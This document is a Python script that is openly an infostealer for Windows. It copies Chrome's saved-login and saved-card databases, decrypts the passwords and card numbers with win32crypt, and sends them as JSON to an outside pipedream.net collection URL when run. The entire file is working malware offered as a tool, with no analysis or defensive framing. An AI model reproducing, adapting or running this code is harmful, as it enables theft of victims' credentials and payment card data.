#Made by the meme factory
#Copyright 2018

#Imports
import sqlite3
import win32crypt
import shutil
import urllib.request
import json
import os
import random
import string

#Classes
class Sender:
	def __init__(self,url):
		self.url = url
	def send(self,data):
		req = urllib.request.Request(self.url)
		jsondata = json.dumps(data)
		reqbytes = jsondata.encode("utf-8")
		req.add_header("Content-Type","application/json; charser=utf-8")
		req.add_header("Content-Length",len(reqbytes))
		req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
		urllib.request.urlopen(req,reqbytes)

class SQLite3Connection:
	def __init__(self,path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			sys.exit()
	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()
	def close(self):
		self.connection.close()

class SQLite3LockedConnection:
	def __init__(self,path):
		self.path = shutil.copy(path,os.getcwd() + "\\" + "".join(random.choice(string.ascii_uppercase)) +".bak")
		self.connection = SQLite3Connection(self.path)
	def run(self,query):
		return self.connection.run(query)
	def close(self):
		self.connection.close()
		os.remove(self.path)

class CardStealer:
	def __init__(self):
		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
	def steal(self):
		data = self.connection.run("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		stolen = []
		if len(data) > 0:
			for result in data:
				cardname = result[0]
				expirationmonth = result[1]
				expirationyear = result[2]
				try:
					cardnumber = win32crypt.CryptUnprotectData(result[3],None,None,None,0)
				except:
					pass
				if cardnumber:
					stolen.append({
						"cardname": cardname,
						"expirationdate": str(expirationmonth) + "/" + str(expirationyear),
						"cardnumber": cardnumber[1].decode()
					})
		else:
			return None
		self.connection.close()
		return stolen

class PasswordStealer:
	def __init__(self):
		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
	def steal(self):
		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
		stolen = []
		if len(data) > 0:
			for result in data:
				url = result[0]
				username = result[1]
				try:
					password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)
				except:
					pass
				if password:
					stolen.append({
						"url": url,
						"username": username,
						"password": password[1].decode()
					})
		else:
			return None
		self.connection.close()
		return stolen

#Functions
def init():
	sender = Sender("https://encvywmf8mn76.x.pipedream.net/")
	cardstealer = CardStealer()
	passstealer = PasswordStealer()
	stolencards = cardstealer.steal()
	stolenpasswords = passstealer.steal()
	data = {"from": "password-stealer"}
	if stolencards:
		data["credit_cards"] = stolencards
	if stolenpasswords:
		data["passwords"] = stolenpasswords
	sender.send(data)

#Main
init()